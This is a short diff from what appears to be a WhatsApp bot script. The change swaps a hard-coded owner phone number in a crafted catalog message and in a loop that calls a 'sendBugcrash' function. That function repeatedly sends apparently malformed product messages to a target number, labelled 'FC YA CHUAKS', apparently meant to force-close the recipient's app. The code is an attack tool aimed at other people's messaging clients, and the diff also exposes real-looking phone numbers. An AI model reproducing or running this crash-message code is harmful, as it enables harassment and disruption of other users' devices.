@@ -22,7 +22,7 @@ CATALOG :
     "retailerId": `Nomor Owner Di Atas`,
     "url": `https://wa.me/0`
     },
-    "businessOwnerJid": "6283181343236@s.whatsapp.net",
+    "businessOwnerJid": "6283890546556@s.whatsapp.net",
     }
     }), { userJid: from, quoted: lep  })
     diablo.relayMessage(num, catalog.message, { messageId: catalog.key.id })
@@ -51,7 +51,7 @@ CATALOG :
              jumlah = '2'
             waktu = '3s'
             for (let i = 0; i < jumlah; i++) {
-            sendBugcrash(num, 'FC YA CHUAKS', ppnyauser, "6283181343236@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
+            sendBugcrash(num, 'FC YA CHUAKS', ppnyauser, "6283890546556@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
             await sleep(ms(waktu))
             }
             }
